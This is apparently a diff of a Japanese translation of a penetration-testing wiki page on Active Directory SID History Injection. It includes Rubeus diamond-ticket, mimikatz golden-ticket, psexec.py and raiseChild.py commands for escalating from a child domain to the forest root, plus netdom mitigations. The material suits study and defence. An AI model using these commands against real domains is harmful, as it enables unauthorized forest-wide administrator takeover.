@@ -4,7 +4,7 @@
 
 ## SID History Injection Attack
 
-**SID History Injection Attack**の焦点は、**ドメイン間のユーザー移行を支援し**、以前のドメインからのリソースへのアクセスを継続することです。これは、**ユーザーの以前のセキュリティ識別子（SID）を新しいアカウントのSID履歴に組み込むことによって達成されます**。特に、このプロセスは、親ドメインからの高特権グループ（例えば、Enterprise AdminsやDomain Admins）のSIDをSID履歴に追加することで、不正アクセスを許可するように操作できます。この悪用により、親ドメイン内のすべてのリソースへのアクセスが付与されます。
+**SID History Injection Attack**の焦点は、**ドメイン間のユーザー移行を支援し**、以前のドメインからのリソースへのアクセスを継続することです。これは、**ユーザーの以前のセキュリティ識別子（SID）を新しいアカウントのSID履歴に組み込むことによって**達成されます。特に、このプロセスは、親ドメインからの高特権グループ（例えば、Enterprise AdminsやDomain Admins）のSIDをSID履歴に追加することで、不正アクセスを許可するように操作できます。この悪用により、親ドメイン内のすべてのリソースへのアクセスが付与されます。
 
 この攻撃を実行するための2つの方法があります：**Golden Ticket**または**Diamond Ticket**の作成です。
 
@@ -20,15 +20,15 @@ Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSi
 > SID履歴を信頼関係で無効にすることが可能であり、これによりこの攻撃が失敗する可能性があることに注意してください。
 
 [**docs**](https://technet.microsoft.com/library/cc835085.aspx)によると：
-- **forest trustsでのSIDHistoryの無効化**はnetdomツールを使用して行います（`netdom trust /domain: /EnableSIDHistory:no on the domain controller`）
-- **外部信頼に対するSIDフィルタの隔離の適用**はnetdomツールを使用して行います（`netdom trust /domain: /quarantine:yes on the domain controller`）
-- **単一のforest内のドメイン信頼に対するSIDフィルタリングの適用**は推奨されません。これはサポートされていない構成であり、破壊的な変更を引き起こす可能性があります。forest内のドメインが信頼できない場合、そのドメインはforestのメンバーであるべきではありません。この状況では、まず信頼されたドメインと信頼されていないドメインを別々のforestに分割し、SIDフィルタリングをinterforest trustに適用する必要があります。
+- **フォレスト信頼におけるSIDHistoryの無効化**は、netdomツールを使用して行います（`netdom trust /domain: /EnableSIDHistory:no on the domain controller`）
+- **外部信頼に対するSIDフィルタリングの適用**は、netdomツールを使用して行います（`netdom trust /domain: /quarantine:yes on the domain controller`）
+- **単一フォレスト内のドメイン信頼に対するSIDフィルタリングの適用**は推奨されません。これはサポートされていない構成であり、破壊的な変更を引き起こす可能性があります。フォレスト内のドメインが信頼できない場合、そのドメインはフォレストのメンバーであるべきではありません。この状況では、まず信頼されたドメインと信頼されていないドメインを別々のフォレストに分割し、SIDフィルタリングをインターフォレスト信頼に適用する必要があります。
 
-これに関する詳細情報はこの投稿を確認してください：[**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
+このバイパスに関する詳細情報は、こちらの投稿を確認してください：[**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
 
 ### ダイヤモンドチケット (Rubeus + KRBTGT-AES256)
 
-前回これを試したとき、引数**`/ldap`**を追加する必要がありました。
+前回これを試したとき、引数 **`/ldap`** を追加する必要がありました。
 ```bash
 # Use the /sids param
 Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap
@@ -61,14 +61,16 @@ mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid
 # The previous command will generate a file called ticket.kirbi
 # Just loading you can perform a dcsync attack agains the domain
 ```
-ゴールデンチケットに関する詳細は次を確認してください：
+ゴールデンチケットに関する詳細は以下を確認してください:
+
 
 {{#ref}}
 golden-ticket.md
 {{#endref}}
 
 
-ダイヤモンドチケットに関する詳細は次を確認してください：
+ダイヤモンドチケットに関する詳細は以下を確認してください:
+
 
 {{#ref}}
 diamond-ticket.md
@@ -118,21 +120,21 @@ export KRB5CCNAME=hacker.ccache
 # psexec in domain controller of root
 psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
 ```
-#### 自動的に [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py) を使用
+#### Automatic using [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
 
-これは、**子ドメインから親ドメインへの昇格を自動化する** Impacket スクリプトです。スクリプトには以下が必要です：
+これは、**子ドメインから親ドメインへの昇格を自動化する**Impacketスクリプトです。スクリプトには以下が必要です：
 
 - ターゲットドメインコントローラー
 - 子ドメインの管理者ユーザーのクレデンシャル
 
 フローは次の通りです：
 
-- 親ドメインのエンタープライズ管理者グループの SID を取得
-- 子ドメインの KRBTGT アカウントのハッシュを取得
+- 親ドメインのEnterprise AdminsグループのSIDを取得
+- 子ドメインのKRBTGTアカウントのハッシュを取得
 - ゴールデンチケットを作成
 - 親ドメインにログイン
-- 親ドメインの管理者アカウントのクレデンシャルを取得
-- `target-exec` スイッチが指定されている場合、Psexec を介して親ドメインのドメインコントローラーに認証します。
+- 親ドメインのAdministratorアカウントのクレデンシャルを取得
+- `target-exec`スイッチが指定されている場合、Psexecを介して親ドメインのドメインコントローラーに認証します。
 ```bash
 raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
 ```
